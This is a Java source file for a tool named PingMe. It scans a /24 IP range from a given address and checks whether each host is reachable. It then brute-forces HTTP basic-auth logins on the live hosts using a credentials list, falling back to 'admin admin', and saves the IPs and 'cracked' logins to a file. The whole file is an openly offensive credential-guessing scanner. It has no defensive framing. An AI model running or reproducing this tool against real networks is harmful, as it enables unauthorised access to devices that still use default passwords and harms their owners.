package ru.cadmy.network;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.net.Authenticator;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.PasswordAuthentication;
import java.net.ProtocolException;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Scanner;

public class PingMe {
	
	private final static String REACHABLE_LIST = "reachable_list.txt";
	private final static String CRACKED_LIST = "cracked_list.txt";
	private final static String CREDITIANLS_LIST = "creditianls.txt";
	private final static String DEFAULT_CREDITIANLS = "admin admin";
	
	public static void main(String[] args){
		ArrayList<String> credits = loadCreditianls();
		if (args.length > 0) {
			String ip = args[0];
			String[] parts = ip.split("\\.");
			int last = 0;
			StringBuilder first = new StringBuilder();
			try {
				first.append(parts[0]);
				first.append(".");
				first.append(parts[1]);
				first.append(".");
				first.append(parts[2]);
				first.append(".");
				last = Integer.valueOf(parts[3]);
			} catch (NumberFormatException e) {
				System.out.println("You should provide valid ip of the following format \"255.255.255.255\"");
			}
				
			InetAddress inet = null;
			String t = "255.255.255.255";
			String [] pair = null;
			for (int i=last; i<256; i++)
			{
				t =  first.toString() + i;
				System.out.println("Analyzing " + t);
				try {
					inet = InetAddress.getByName(t);
					if (inet.isReachable(2000)) {
						writeToReachableList(t);
						for  (String str : credits)
						{
							pair  = str.split(" ");
							//System.out.println(" - " + t + " \"" + pair[0] + "\" \"" + pair[1] + "\"");
							if (login(t, pair[0], pair[1]) == true) {
								writeToCrackedList(t, pair[0], pair[1]);
								break;
							}	
						}
					}
				} catch (UnknownHostException e) {
					System.out.println(" Invalid ip");
				} catch (IOException e) {
					System.out.println(" Invalid ip");
				}
			}	
		}
	}

	private static void writeToReachableList(String ip) {
		try {
            FileWriter fileWriter =
                new FileWriter(REACHABLE_LIST);

            BufferedWriter bufferedWriter =
                new BufferedWriter(fileWriter);
            bufferedWriter.write(ip);
            bufferedWriter.newLine();
            bufferedWriter.close();
        }
        catch(IOException ex) {
            System.out.println("Error writing to file '"+ REACHABLE_LIST + "'");
        }
	}
	
	private static void writeToCrackedList(String ip, String login, String password) {
		try {
            FileWriter fileWriter =
                new FileWriter(CRACKED_LIST);

            BufferedWriter bufferedWriter =
                new BufferedWriter(fileWriter);
            bufferedWriter.write(ip);
            bufferedWriter.write(" ");
            bufferedWriter.write(login);
            bufferedWriter.write(" ");
            bufferedWriter.write(password);
            bufferedWriter.newLine();
            bufferedWriter.close();
        }
        catch(IOException ex) {
            System.out.println("Error writing to file '"+ CRACKED_LIST + "'");
        }
	}

	private static ArrayList<String> loadCreditianls() {
        
        String line = null;
        ArrayList<String> creditianls = new ArrayList<>();
		try {

            FileReader fileReader = 
                new FileReader(CREDITIANLS_LIST);

            BufferedReader bufferedReader = 
                new BufferedReader(fileReader);

            while((line = bufferedReader.readLine()) != null) {
            	creditianls.add(line);
            }   

            bufferedReader.close(); 
            
            return creditianls; 
        } catch(IOException e) {
        	creditianls.add(DEFAULT_CREDITIANLS);
        	return creditianls;           
        } 
		
	}

	private static boolean login(String ip, String login, String password) throws ProtocolException {	
		try {		
			Authenticator.setDefault (new Authenticator() {
			    protected PasswordAuthentication getPasswordAuthentication() {
			        return new PasswordAuthentication (login, password.toCharArray());
			    }
			});
			URL url = new URL("http://" + ip);
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			Scanner scanner = new Scanner(connection.getInputStream());
			scanner.useDelimiter("\\Z");
			scanner.next();	
		} catch (ProtocolException e) {
			return false;
		} catch (IOException e) {
			return false;
		}
		return true;
	}
	
	

}
